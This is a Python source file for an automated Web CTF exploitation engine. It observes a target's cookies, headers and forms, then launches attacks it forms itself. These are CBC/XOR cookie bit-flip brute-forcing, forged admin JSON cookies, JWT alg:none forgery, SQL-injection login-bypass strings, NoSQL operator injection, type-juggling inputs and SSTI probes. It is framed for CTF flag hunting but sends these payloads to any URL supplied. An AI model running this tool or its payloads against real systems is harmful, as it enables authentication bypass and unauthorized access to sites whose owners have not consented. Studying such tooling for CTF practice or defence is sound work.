"""
CTF Logical Reasoner - A human-like reasoning engine for Web CTF challenges.

This engine does NOT rely on static payload templates. Instead, it:
  1. OBSERVES the application's behavior (responses, cookies, headers, timing)
  2. FORMS hypotheses about the underlying logic (what is the app doing?)
  3. TESTS each hypothesis with targeted probes (not blind payloads)
  4. LEARNS from each response to refine the next probe
  5. DEEP-DIVES into confirmed vulnerabilities before moving on

The key difference from the old approach:
  - OLD: "Try SQLi payload list on every param" (blind, template-driven)
  - NEW: "The cookie is base64-encoded and high-entropy -> it's encrypted.
         Let me decode it, analyze the structure, and figure out the cipher."
"""

import re
import time
import json
import base64
import hashlib
import urllib.parse
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs

from core.ui import (
    console, print_header, print_success, print_info, print_warning,
    print_error, print_table, print_flag
)
from core.utils import find_flags, create_session


class Observation:
    """A single observed fact about the application."""
    def __init__(self, category: str, detail: str, confidence: float = 1.0):
        self.category = category      # e.g. "cookie", "header", "response", "behavior"
        self.detail = detail          # human-readable description
        self.confidence = confidence  # 0.0 - 1.0

    def __repr__(self):
        return f"[{self.category}] {self.detail}"


class Hypothesis:
    """A testable theory about the application's logic."""
    def __init__(self, title: str, logic: str, test: str, confidence: float,
                 observations: List[str], exploit: str = ""):
        self.title = title
        self.logic = logic            # what we think the app is doing
        self.test = test              # how to confirm/refute this theory
        self.confidence = confidence
        self.observations = observations
        self.exploit = exploit        # how to exploit if confirmed

    def to_dict(self):
        return {
            "title": self.title,
            "logic": self.logic,
            "test": self.test,
            "confidence": round(self.confidence, 2),
            "observations": self.observations,
            "exploit": self.exploit,
        }


class CTFReasoner:
    """
    Human-like logical reasoning engine for Web CTF challenges.
    Focuses on UNDERSTANDING the application rather than firing payloads.
    """

    def __init__(self, target_url: str, session=None, state: Optional[Dict] = None):
        self.target_url = target_url.strip()
        parsed = urlparse(self.target_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.session = session or create_session()
        self.state = state or {}
        self.observations: List[Observation] = []
        self.hypotheses: List[Hypothesis] = []
        self.probe_results: List[Dict] = []

    # ═══════════════════════════════════════════════════════════════════
    # 1. OBSERVATION - Collect facts about the application
    # ═══════════════════════════════════════════════════════════════════
    def observe(self) -> List[Observation]:
        """Systematically observe the application's behavior."""
        self.observations = []

        # ── 1.1 Fetch root and observe response ────────────────────────
        try:
            r = self.session.get(self.target_url, timeout=8, allow_redirects=False)
            self.observations.append(Observation(
                "response",
                f"Root returns status {r.status_code}"
            ))
            if r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                self.observations.append(Observation(
                    "response",
                    f"Root redirects to {loc}"
                ))
                # Follow redirect to see where it goes
                try:
                    r2 = self.session.get(self.target_url, timeout=8)
                    self.observations.append(Observation(
                        "response",
                        f"Following redirect -> status {r2.status_code}, length {len(r2.text)}"
                    ))
                except Exception:
                    pass
            else:
                self.observations.append(Observation(
                    "response",
                    f"Root body length: {len(r.text)} bytes"
                ))
        except Exception as e:
            self.observations.append(Observation(
                "response",
                f"Failed to fetch root: {e}",
                confidence=0.5
            ))

        # ── 1.2 Observe cookies ────────────────────────────────────────
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except Exception:
                pass

        for cname, cval in cookies.items():
            obs = self._analyze_cookie(cname, cval)
            self.observations.extend(obs)

        # ── 1.3 Observe headers ────────────────────────────────────────
        try:
            r = self.session.get(self.target_url, timeout=8)
            for hname, hval in r.headers.items():
                hl = hname.lower()
                if hl in ("server", "x-powered-by", "set-cookie", "content-type"):
                    self.observations.append(Observation(
                        "header",
                        f"{hname}: {hval}"
                    ))
        except Exception:
            pass

        # ── 1.4 Observe forms and inputs ───────────────────────────────
        forms = self.state.get("forms", [])
        for f in forms:
            action = f.get("action", "?")
            method = f.get("method", "GET")
            inputs = [i.get("name", "") for i in f.get("inputs", [])]
            self.observations.append(Observation(
                "form",
                f"Form {method} {action} with inputs: {', '.join(inputs)}"
            ))

        # ── 1.5 Observe parameters ─────────────────────────────────────
        params = list(self.state.get("parameters", []))
        if params:
            self.observations.append(Observation(
                "parameter",
                f"Discovered parameters: {', '.join(params)}"
            ))

        # ── 1.6 Observe tech stack ─────────────────────────────────────
        tech = self.state.get("tech_stack", [])
        if tech:
            self.observations.append(Observation(
                "tech",
                f"Tech stack: {', '.join(tech)}"
            ))

        return self.observations

    def _analyze_cookie(self, cname: str, cval: str) -> List[Observation]:
        """Deep-analyze a cookie to understand its structure."""
        obs = []
        cl = cname.lower()

        # ── Cookie name hints ──────────────────────────────────────────
        if any(k in cl for k in ["admin", "role", "user", "auth", "logged", "is_", "privilege"]):
            obs.append(Observation(
                "cookie",
                f"Cookie '{cname}' name suggests client-side authorization",
                confidence=0.8
            ))

        # ── Cookie value structure analysis ────────────────────────────
        # Is it base64?
        try:
            decoded = base64.b64decode(cval, validate=True)
            obs.append(Observation(
                "cookie",
                f"Cookie '{cname}' is base64-encoded ({len(decoded)} bytes after decode)"
            ))

            # Is the decoded content printable (plaintext) or binary (encrypted)?
            printable = sum(1 for b in decoded if 32 <= b <= 126)
            ratio = printable / len(decoded) if decoded else 0

            # ── Try to parse as JSON first ─────────────────────────────
            is_json = False
            try:
                json_data = json.loads(decoded.decode('utf-8'))
                is_json = True
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' decodes to JSON: {json_data}",
                    confidence=1.0
                ))
                # JSON cookie -> direct manipulation possible
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' is plaintext JSON - can modify and re-encode",
                    confidence=0.95
                ))
            except Exception:
                pass

            if not is_json:
                # ── Not JSON. Analyze the structure more deeply. ──────
                # XOR-encrypted data can look printable if the key is printable.
                # We need to check for signs of encryption:
                #   1. High entropy (random-looking characters)
                #   2. No recognizable structure (no spaces, no common words)
                #   3. Length doesn't match expected plaintext
                #   4. Contains non-printable bytes mixed with printable

                # Check for non-printable bytes (strong encryption signal)
                non_printable = sum(1 for b in decoded if b < 32 or b > 126)

                # Check character frequency distribution (entropy)
                from collections import Counter
                freq = Counter(decoded)
                unique_ratio = len(freq) / len(decoded) if decoded else 0

                # Check for common English words / JSON markers
                text = decoded.decode('utf-8', errors='ignore')
                has_common_words = any(w in text for w in ["admin", "user", "true", "false", "guest", "role", "session", "login", "password", "the", "and", "this", "that"])

                # Check for spaces (plaintext usually has spaces)
                has_spaces = " " in text

                # Check for JSON markers
                has_json_markers = "{" in text or "}" in text or '"' in text

                # Check if text looks random (no vowels, no common letter patterns)
                # XOR-encrypted text with a printable key looks like random letters
                # with no recognizable structure
                import string as _string
                letters = [c for c in text if c.isalpha()]
                vowels = sum(1 for c in letters if c.lower() in "aeiou")
                vowel_ratio = vowels / len(letters) if letters else 0

                if non_printable > 0:
                    # Has binary bytes -> definitely encrypted
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' contains {non_printable} non-printable bytes - ENCRYPTED",
                        confidence=0.95
                    ))
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' may be CBC-encrypted -> bit-flipping attack possible",
                        confidence=0.8
                    ))
                elif not has_spaces and not has_common_words and not has_json_markers:
                    # No spaces, no common words, no JSON markers -> looks encrypted
                    # This is the key signal: plaintext data (JSON, serialized, etc.)
                    # always has spaces or recognizable structure
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' has no spaces, no common words, no JSON markers - likely XOR-ENCRYPTED",
                        confidence=0.9
                    ))
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' may be XOR-encrypted -> bit-flipping attack possible",
                        confidence=0.8
                    ))
                elif unique_ratio > 0.7 and not has_common_words:
                    # High entropy, no recognizable words -> likely XOR-encrypted
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' has high entropy ({unique_ratio*100:.0f}% unique chars) and no recognizable words - likely XOR-ENCRYPTED",
                        confidence=0.85
                    ))
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' may be XOR-encrypted -> bit-flipping attack possible",
                        confidence=0.75
                    ))
                elif ratio > 0.9:
                    # Printable but not JSON and has common words -> serialized data
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' decodes to printable text (likely serialized data)",
                        confidence=0.8
                    ))
                    if cval.startswith(("O:", "a:", "s:", "i:")):
                        obs.append(Observation(
                            "cookie",
                            f"Cookie '{cname}' is PHP-serialized data",
                            confidence=0.9
                        ))
                else:
                    # Mixed content - could be double-encoded
                    obs.append(Observation(
                        "cookie",
                        f"Cookie '{cname}' decodes to mixed content (possibly double-encoded)"
                    ))
                    # Try double decode
                    try:
                        decoded2 = base64.b64decode(decoded)
                        printable2 = sum(1 for b in decoded2 if 32 <= b <= 126)
                        ratio2 = printable2 / len(decoded2) if decoded2 else 0
                        if ratio2 > 0.9:
                            obs.append(Observation(
                                "cookie",
                                f"Cookie '{cname}' is DOUBLE base64-encoded -> inner is plaintext",
                                confidence=0.9
                            ))
                        elif ratio2 < 0.6:
                            obs.append(Observation(
                                "cookie",
                                f"Cookie '{cname}' is DOUBLE base64-encoded -> inner is encrypted",
                                confidence=0.9
                            ))
                    except Exception:
                        pass
        except Exception:
            # Not base64 - check other encodings
            if cval.startswith(("O:", "a:", "s:", "i:")):
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' is PHP-serialized data",
                    confidence=0.9
                ))
            elif cval.count(".") == 2:
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' is a JWT token",
                    confidence=0.95
                ))
            elif cval.startswith("eyJ"):
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' starts with 'eyJ' (base64 JSON - likely JWT)",
                    confidence=0.9
                ))
            else:
                obs.append(Observation(
                    "cookie",
                    f"Cookie '{cname}' value: {cval[:50]}..."
                ))

        return obs

    # ═══════════════════════════════════════════════════════════════════
    # 2. HYPOTHESIS - Form theories about the application's logic
    # ═══════════════════════════════════════════════════════════════════
    def hypothesize(self) -> List[Hypothesis]:
        """Form testable hypotheses based on observations."""
        self.hypotheses = []
        obs_by_cat = {}
        for o in self.observations:
            obs_by_cat.setdefault(o.category, []).append(o)

        # ── H1: Encrypted cookie -> CBC bit-flip ───────────────────────
        encrypted_cookies = [
            o for o in self.observations
            if o.category == "cookie" and "encrypted" in o.detail.lower()
        ]
        if encrypted_cookies:
            self.hypotheses.append(Hypothesis(
                title="Encrypted Cookie - CBC Bit-Flipping Attack",
                logic="The cookie is encrypted (likely CBC mode). Flipping bits in the ciphertext changes the decrypted plaintext. If the plaintext is JSON like {'admin': false}, we can flip 'false' to 'true'.",
                test="Decode base64, flip bits in the first few bytes (where JSON keys appear), re-encode, and check if the response changes (admin access / flag).",
                confidence=0.9,
                observations=[o.detail for o in encrypted_cookies],
                exploit="CBC bit-flipping: flip bits in ciphertext to change decrypted plaintext"
            ))

        # ── H2: Plaintext JSON cookie -> direct manipulation ───────────
        json_cookies = [
            o for o in self.observations
            if o.category == "cookie" and "JSON" in o.detail
        ]
        if json_cookies:
            self.hypotheses.append(Hypothesis(
                title="Plaintext JSON Cookie - Direct Manipulation",
                logic="The cookie is base64-encoded JSON. We can decode it, modify the JSON (e.g. set admin=true), re-encode, and send it back.",
                test="Decode base64, parse JSON, modify fields, re-encode, send request.",
                confidence=0.95,
                observations=[o.detail for o in json_cookies],
                exploit="Decode -> modify JSON -> re-encode -> send"
            ))

        # ── H3: JWT cookie -> alg none / secret brute-force ────────────
        jwt_cookies = [
            o for o in self.observations
            if o.category == "cookie" and ("JWT" in o.detail or "eyJ" in o.detail)
        ]
        if jwt_cookies:
            self.hypotheses.append(Hypothesis(
                title="JWT Token - Algorithm Confusion / Secret Brute-Force",
                logic="The cookie is a JWT. We can try alg:none, or brute-force the HMAC secret.",
                test="Decode JWT header/payload, try alg:none, try common secrets.",
                confidence=0.9,
                observations=[o.detail for o in jwt_cookies],
                exploit="JWT alg:none or secret brute-force"
            ))

        # ── H4: Serialized cookie -> deserialization ───────────────────
        serialized_cookies = [
            o for o in self.observations
            if o.category == "cookie" and "serialized" in o.detail.lower()
        ]
        if serialized_cookies:
            self.hypotheses.append(Hypothesis(
                title="Serialized Cookie - Deserialization Attack",
                logic="The cookie contains serialized data (PHP/Java/Python). We can craft a malicious serialized object.",
                test="Craft malicious serialized payload and send as cookie.",
                confidence=0.85,
                observations=[o.detail for o in serialized_cookies],
                exploit="Deserialization RCE"
            ))

        # ── H5: Login form -> auth bypass ──────────────────────────────
        auth_forms = [
            o for o in self.observations
            if o.category == "form" and any(k in o.detail.lower() for k in ["pass", "user", "login"])
        ]
        if auth_forms:
            self.hypotheses.append(Hypothesis(
                title="Login Form - Authentication Bypass",
                logic="The app has a login form. Common bypasses: SQLi, type juggling, default creds, array injection.",
                test="Try SQLi auth bypass, magic hashes, array injection on username/password fields.",
                confidence=0.7,
                observations=[o.detail for o in auth_forms],
                exploit="SQLi / type juggling / array injection auth bypass"
            ))

        # ── H6: File upload form -> webshell ───────────────────────────
        upload_forms = [
            o for o in self.observations
            if o.category == "form" and "file" in o.detail.lower()
        ]
        if upload_forms:
            self.hypotheses.append(Hypothesis(
                title="File Upload - Webshell / Malicious File",
                logic="The app accepts file uploads. We can upload a webshell or malicious file.",
                test="Upload a PHP/Python webshell, or a file with path traversal in the name.",
                confidence=0.8,
                observations=[o.detail for o in upload_forms],
                exploit="Upload webshell -> RCE"
            ))

        # ── H7: Reflected params -> injection ──────────────────────────
        reflected = self.state.get("reflected_params", [])
        if reflected:
            self.hypotheses.append(Hypothesis(
                title=f"Reflected Parameters - Injection Surface ({', '.join(reflected)})",
                logic=f"Parameters {', '.join(reflected)} reflect input. Need to determine the reflection context (HTML, JS, template, SQL) to pick the right injection.",
                test="Probe each reflected param with context-detection canaries to determine where input lands.",
                confidence=0.8,
                observations=[f"Parameters reflect input: {', '.join(reflected)}"],
                exploit="Context-aware injection (SSTI/SQLi/XSS)"
            ))

        # ── H8: Tech stack hints ───────────────────────────────────────
        tech = self.state.get("tech_stack", [])
        tech_lower = [t.lower() for t in tech]
        if any("flask" in t or "werkzeug" in t or "python" in t for t in tech_lower):
            self.hypotheses.append(Hypothesis(
                title="Python/Flask - SSTI Likely",
                logic="Flask/Werkzeug detected. Jinja2 SSTI is a common CTF vector.",
                test="Probe params with {{7*7}} and check if 49 is reflected.",
                confidence=0.6,
                observations=[f"Tech stack: {', '.join(tech)}"],
                exploit="Jinja2 SSTI RCE"
            ))
        if any("php" in t for t in tech_lower):
            self.hypotheses.append(Hypothesis(
                title="PHP - Type Juggling / LFI / RCE",
                logic="PHP detected. Common vectors: type juggling, LFI, command injection, deserialization.",
                test="Probe for LFI (file params), type juggling (login), command injection.",
                confidence=0.6,
                observations=[f"Tech stack: {', '.join(tech)}"],
                exploit="PHP-specific vectors"
            ))

        # Sort by confidence
        self.hypotheses.sort(key=lambda h: h.confidence, reverse=True)
        return self.hypotheses

    # ═══════════════════════════════════════════════════════════════════
    # 3. TEST - Confirm or refute hypotheses with targeted probes
    # ═══════════════════════════════════════════════════════════════════
    def test_hypothesis(self, h: Hypothesis) -> Dict[str, Any]:
        """
        Test a hypothesis with targeted probes. Returns result dict.
        This is where the tool actually THINKS - it probes, observes the
        response, and decides whether the hypothesis is confirmed.
        """
        result = {
            "hypothesis": h.title,
            "confirmed": False,
            "evidence": [],
            "exploit": h.exploit,
        }

        # ── Test H1: CBC bit-flip ──────────────────────────────────────
        if "CBC Bit-Flipping" in h.title:
            result = self._test_cbc_bitflip(result)

        # ── Test H2: Plaintext JSON cookie ─────────────────────────────
        elif "Plaintext JSON Cookie" in h.title:
            result = self._test_json_cookie(result)

        # ── Test H3: JWT ───────────────────────────────────────────────
        elif "JWT Token" in h.title:
            result = self._test_jwt(result)

        # ── Test H4: Deserialization ───────────────────────────────────
        elif "Deserialization" in h.title:
            result = self._test_deserialization(result)

        # ── Test H5: Auth bypass ───────────────────────────────────────
        elif "Authentication Bypass" in h.title:
            result = self._test_auth_bypass(result)

        # ── Test H6: File upload ───────────────────────────────────────
        elif "File Upload" in h.title:
            result = self._test_file_upload(result)

        # ── Test H7: Reflected params ──────────────────────────────────
        elif "Reflected Parameters" in h.title:
            result = self._test_reflection(result)

        # ── Test H8: Tech stack ────────────────────────────────────────
        elif "SSTI Likely" in h.title:
            result = self._test_ssti(result)

        return result

    def _test_cbc_bitflip(self, result: Dict) -> Dict:
        """Test CBC bit-flip hypothesis by flipping bits in the cookie."""
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except Exception:
                return result

        for cname, cval in cookies.items():
            try:
                layers = 1
                decoded = base64.b64decode(cval)
                # Try double decode
                try:
                    decoded2 = base64.b64decode(decoded)
                    printable2 = sum(1 for b in decoded2 if 32 <= b <= 126)
                    ratio2 = printable2 / len(decoded2) if decoded2 else 0
                    if ratio2 < 0.6:  # Inner is binary
                        decoded = decoded2
                        layers = 2
                except Exception:
                    pass

                # Check if encrypted (high entropy OR XOR-encrypted printable text)
                printable = sum(1 for b in decoded if 32 <= b <= 126)
                ratio = printable / len(decoded) if decoded else 0

                # Check for signs of encryption:
                # 1. Non-printable bytes (binary encryption)
                # 2. No spaces, no common words, no JSON markers (XOR encryption)
                from collections import Counter
                freq = Counter(decoded)
                unique_ratio = len(freq) / len(decoded) if decoded else 0
                text = decoded.decode('utf-8', errors='ignore')
                has_common_words = any(w in text for w in ["admin", "user", "true", "false", "guest", "role", "session", "login", "password", "the", "and", "this", "that"])
                has_spaces = " " in text
                has_json_markers = "{" in text or "}" in text or '"' in text

                is_encrypted = False
                if ratio < 0.6:
                    is_encrypted = True  # binary data
                elif not has_spaces and not has_common_words and not has_json_markers:
                    is_encrypted = True  # XOR-encrypted printable text
                elif unique_ratio > 0.7 and not has_common_words:
                    is_encrypted = True  # high entropy

                if not is_encrypted:
                    continue  # plaintext, skip

                # Flip bits in the first 40 bytes (where JSON keys appear)
                print_info(f"  Testing CBC bit-flip on cookie '{cname}' (depth: {layers})...")
                for pos in range(min(40, len(decoded))):
                    for bit in range(128):
                        altered = bytearray(decoded)
                        altered[pos] ^= bit
                        new_cookie_bytes = base64.b64encode(bytes(altered))
                        if layers == 2:
                            new_cookie_bytes = base64.b64encode(new_cookie_bytes)
                        new_cookie = new_cookie_bytes.decode()
                        try:
                            r = self.session.get(
                                self.target_url,
                                cookies={cname: new_cookie},
                                timeout=5
                            )
                            if "picoctf{" in r.text.lower() or "flag{" in r.text.lower():
                                result["confirmed"] = True
                                result["evidence"].append(
                                    f"Bit-flip at position {pos} (bit {bit}) revealed flag!"
                                )
                                result["exploit"] = f"Cookie: {new_cookie}"
                                return result
                        except Exception:
                            continue
                # If no flag found, at least note the structure
                result["evidence"].append(
                    f"Cookie '{cname}' is encrypted ({len(decoded)} bytes, {ratio*100:.0f}% printable, {unique_ratio*100:.0f}% unique)"
                )
            except Exception:
                continue
        return result

    def _test_json_cookie(self, result: Dict) -> Dict:
        """Test plaintext JSON cookie by modifying the JSON."""
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except Exception:
                return result

        for cname, cval in cookies.items():
            try:
                decoded = base64.b64decode(cval)
                json_data = json.loads(decoded.decode('utf-8'))
                print_info(f"  Cookie '{cname}' decodes to JSON: {json_data}")

                # Try to set admin=true
                if isinstance(json_data, dict):
                    modified = dict(json_data)
                    # Try common admin fields
                    for key in ["admin", "is_admin", "role", "isAdmin", "privileged"]:
                        if key in modified:
                            modified[key] = True
                            new_cookie = base64.b64encode(
                                json.dumps(modified).encode()
                            ).decode()
                            try:
                                r = self.session.get(
                                    self.target_url,
                                    cookies={cname: new_cookie},
                                    timeout=5
                                )
                                if "picoctf{" in r.text.lower() or "flag{" in r.text.lower():
                                    result["confirmed"] = True
                                    result["evidence"].append(
                                        f"Modified '{key}' to true -> flag revealed!"
                                    )
                                    result["exploit"] = f"Cookie: {new_cookie}"
                                    return result
                            except Exception:
                                continue
            except Exception:
                continue
        return result

    def _test_jwt(self, result: Dict) -> Dict:
        """Test JWT hypothesis."""
        cookies = self.state.get("cookies", {})
        if not cookies:
            try:
                r = self.session.get(self.target_url, timeout=8)
                cookies = r.cookies.get_dict()
            except Exception:
                return result

        for cname, cval in cookies.items():
            if cval.count(".") != 2:
                continue
            print_info(f"  Testing JWT on cookie '{cname}'...")
            try:
                # Decode header and payload
                header_b64, payload_b64, sig = cval.split(".")
                header = json.loads(base64.b64decode(header_b64 + "=="))
                payload = json.loads(base64.b64decode(payload_b64 + "=="))
                print_info(f"    JWT header: {header}")
                print_info(f"    JWT payload: {payload}")

                # Try alg:none
                new_header = dict(header)
                new_header["alg"] = "none"
                new_header_b64 = base64.b64encode(
                    json.dumps(new_header).encode()
                ).decode().rstrip("=")
                new_payload = dict(payload)
                # Try to set admin
                for key in ["admin", "is_admin", "role"]:
                    if key in new_payload:
                        new_payload[key] = True
                new_payload_b64 = base64.b64encode(
                    json.dumps(new_payload).encode()
                ).decode().rstrip("=")
                forged = f"{new_header_b64}.{new_payload_b64}."
                try:
                    r = self.session.get(
                        self.target_url,
                        cookies={cname: forged},
                        timeout=5
                    )
                    if "picoctf{" in r.text.lower() or "flag{" in r.text.lower():
                        result["confirmed"] = True
                        result["evidence"].append("JWT alg:none bypass revealed flag!")
                        result["exploit"] = f"Cookie: {forged}"
                        return result
                except Exception:
                    pass
            except Exception:
                continue
        return result

    def _test_deserialization(self, result: Dict) -> Dict:
        """Test deserialization hypothesis."""
        # This is complex - just note the surface for now
        result["evidence"].append("Deserialization surface detected - needs crafted payload")
        return result

    def _test_auth_bypass(self, result: Dict) -> Dict:
        """Test auth bypass hypothesis."""
        forms = self.state.get("forms", [])
        for f in forms:
            action = f.get("action", self.target_url)
            method = f.get("method", "POST")
            inputs = [i.get("name", "") for i in f.get("inputs", [])]
            username_field = next((i for i in inputs if i in ["username", "email", "user"]), None)
            password_field = next((i for i in inputs if "pass" in i.lower()), None)
            if not username_field or not password_field:
                continue

            # Determine likely tech stack
            tech = self.state.get("tech_stack", [])
            tech_lower = [t.lower() for t in tech]
            is_node = any("node" in t or "express" in t for t in tech_lower)

            # Try Auth bypass
            print_info(f"  Testing Auth bypass on {action}...")
            payloads = [
                {"username": "' OR '1'='1' -- ", "password": "x"},
                {"username": "admin' -- ", "password": "x"},
                {"username": "' OR 1=1#", "password": "x"},
                {"username": "admin", "password": "' OR '1'='1"},
            ]
            if is_node:
                # Add NoSQL JSON payloads
                payloads.extend([
                    {"username": {"$ne": ""}, "password": {"$ne": ""}},
                    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
                    {"username": {"$gt": ""}, "password": {"$gt": ""}},
                ])
                # Add type juggling payloads
                payloads.extend([
                    {"username": "admin", "password": []},
                    {"username": "admin", "password": {}},
                ])

            for p in payloads:
                data = {**{i: "" for i in inputs}, **p}
                try:
                    if method == "POST":
                        # If is_node, send as JSON by default for NoSQL injection
                        if is_node and any(isinstance(v, (dict, list)) for v in p.values()):
                            r = self.session.post(action, json=data, timeout=5)
                        else:
                            r = self.session.post(action, data=data, timeout=5)
                    else:
                        r = self.session.get(action, params=data, timeout=5)
                    if r.status_code in (301, 302) or any(
                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                    ):
                        result["confirmed"] = True
                        result["evidence"].append(f"SQLi bypass with {p}")
                        result["exploit"] = f"POST {action} with {p}"
                        return result
                except Exception:
                    continue
        return result

    def _test_file_upload(self, result: Dict) -> Dict:
        """Test file upload hypothesis."""
        # Note the surface - actual exploitation is complex
        result["evidence"].append("File upload surface detected - needs webshell payload")
        return result

    def _test_reflection(self, result: Dict) -> Dict:
        """Test reflected params to determine injection context."""
        reflected = self.state.get("reflected_params", [])
        for param in reflected[:3]:
            # Test SSTI
            print_info(f"  Testing SSTI on param '{param}'...")
            try:
                r = self.session.get(
                    self.target_url,
                    params={param: "{{7*7}}"},
                    timeout=5
                )
                if "49" in r.text:
                    result["confirmed"] = True
                    result["evidence"].append(f"SSTI confirmed on param '{param}' ({{{{7*7}}}} -> 49)")
                    result["exploit"] = f"Jinja2 SSTI RCE on param '{param}'"
                    return result
            except Exception:
                pass

            # Test SQLi
            print_info(f"  Testing SQLi on param '{param}'...")
            try:
                r = self.session.get(
                    self.target_url,
                    params={param: "'"},
                    timeout=5
                )
                if any(k in r.text.lower() for k in ["sql", "syntax", "error", "mysql", "sqlite"]):
                    result["confirmed"] = True
                    result["evidence"].append(f"SQLi error on param '{param}'")
                    result["exploit"] = f"SQLi on param '{param}'"
                    return result
            except Exception:
                pass
        return result

    def _test_ssti(self, result: Dict) -> Dict:
        """Test SSTI hypothesis."""
        params = list(self.state.get("parameters", []))
        for param in params[:5]:
            try:
                r = self.session.get(
                    self.target_url,
                    params={param: "{{7*7}}"},
                    timeout=5
                )
                if "49" in r.text:
                    result["confirmed"] = True
                    result["evidence"].append(f"SSTI confirmed on param '{param}'")
                    result["exploit"] = f"Jinja2 SSTI RCE on param '{param}'"
                    return result
            except Exception:
                continue
        return result

    # ═══════════════════════════════════════════════════════════════════
    # 4. REASON - Run the full reasoning cycle
    # ═══════════════════════════════════════════════════════════════════
    def reason(self) -> Dict[str, Any]:
        """
        Run the complete reasoning cycle:
        observe -> hypothesize -> test -> report
        """
        print_header("محرك التفكير المنطقي", "CTF Logical Reasoner - Human-Like Analysis")

        # 1. Observe
        print_info("Step 1: Observing application behavior...")
        observations = self.observe()
        if observations:
            rows = [[o.category, o.detail, f"{o.confidence*100:.0f}%"] for o in observations]
            print_table(["Category", "Observation", "Confidence"], rows, title="Application Observations")

        # 2. Hypothesize
        print_info("Step 2: Forming hypotheses about application logic...")
        hypotheses = self.hypothesize()
        if hypotheses:
            rows = [[h.title, h.logic[:60], f"{h.confidence*100:.0f}%"] for h in hypotheses]
            print_table(["Hypothesis", "Logic", "Confidence"], rows, title="Formed Hypotheses")
        else:
            print_info("No hypotheses formed - need more observations.")

        # 3. Test
        print_info("Step 3: Testing hypotheses with targeted probes...")
        results = []
        for h in hypotheses:
            print_info(f"  Testing: {h.title}")
            result = self.test_hypothesis(h)
            results.append(result)
            if result["confirmed"]:
                print_success(f"  ✓ CONFIRMED: {h.title}")
                for ev in result["evidence"]:
                    print_success(f"    Evidence: {ev}")
            else:
                print_info(f"  ✗ Not confirmed: {h.title}")

        # 4. Report
        confirmed = [r for r in results if r["confirmed"]]
        return {
            "observations": [o.__dict__ for o in observations],
            "hypotheses": [h.to_dict() for h in hypotheses],
            "test_results": results,
            "confirmed": confirmed,
        }
